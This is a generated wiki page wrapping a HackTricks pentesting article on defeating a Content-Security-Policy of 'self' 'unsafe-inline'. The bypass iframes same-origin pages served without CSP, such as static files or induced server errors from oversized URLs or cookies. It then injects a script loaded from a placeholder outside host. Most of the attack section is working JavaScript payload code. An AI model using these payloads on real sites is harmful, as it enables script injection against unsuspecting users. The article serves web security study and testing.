---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# CSP Bypass via Self + Unsafe Inline with Iframes

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-content-security-policy-csp-bypass-csp-bypass-self-unsafe-inline-with-iframes` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CSP Bypass via Self + Unsafe Inline with Iframes](../../topics/pentesting-web/csp-bypass-via-self-unsafe-inline-with-iframes.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-content-security-policy-csp-bypass-csp-bypass-self-unsafe-inline-with-iframes |
| name | CSP Bypass via Self + Unsafe Inline with Iframes |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.md |

## Preserved Source Material

````yaml
_body: "# CSP Bypass via Self + Unsafe Inline with Iframes\n\n{{#include ../../banners/hacktricks-training.md}}\n\nA configuration\
  \ such as:\n\n```\nContent-Security-Policy: default-src 'self' 'unsafe-inline';\n```\n\nProhibits usage of any functions\
  \ that execute code transmitted as a string. For example: `eval, setTimeout, setInterval` will all be blocked because of\
  \ the setting `unsafe-eval`\n\nAny content from external sources is also blocked, including images, CSS, WebSockets, and,\
  \ especially, JS\n\n## Via Text & Images\n\nIt's observed that modern browsers convert images and texts into HTML to enhance\
  \ their display (e.g., setting backgrounds, centering, etc.). Consequently, if an image or text file, such as `favicon.ico`\
  \ or `robots.txt`, is opened via an `iframe`, it's rendered as HTML. Notably, these pages often lack CSP headers and may\
  \ not include X-Frame-Options, enabling the execution of arbitrary JavaScript from them:\n\n```javascript\nframe = document.createElement(\"\
  iframe\")\nframe.src = \"/css/bootstrap.min.css\"\ndocument.body.appendChild(frame)\nscript = document.createElement(\"\
  script\")\nscript.src = \"//example.com/csp.js\"\nwindow.frames[0].document.head.appendChild(script)\n```\n\n## Via Errors\n\
  \nSimilarly, error responses, like text files or images, typically come without CSP headers and might omit X-Frame-Options.\
  \ Errors can be induced to load within an iframe, allowing for the following actions:\n\n```javascript\n// Inducing an nginx\
  \ error\nframe = document.createElement(\"iframe\")\nframe.src = \"/%2e%2e%2f\"\ndocument.body.appendChild(frame)\n\n//\
  \ Triggering an error with a long URL\nframe = document.createElement(\"iframe\")\nframe.src = \"/\" + \"A\".repeat(20000)\n\
  document.body.appendChild(frame)\n\n// Generating an error via extensive cookies\nfor (var i = 0; i < 5; i++) {\n  document.cookie\
  \ = i + \"=\" + \"a\".repeat(4000)\n}\nframe = document.createElement(\"iframe\")\nframe.src = \"/\"\ndocument.body.appendChild(frame)\n\
  // Removal of cookies is crucial post-execution\nfor (var i = 0; i < 5; i++) {\n  document.cookie = i + \"=\"\n}\n```\n\n\
  After triggering any of the mentioned scenarios, JavaScript execution within the iframe is achievable as follows:\n\n```javascript\n\
  script = document.createElement(\"script\")\nscript.src = \"//example.com/csp.js\"\nwindow.frames[0].document.head.appendChild(script)\n\
  ```\n\n## References\n\n- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.md
````
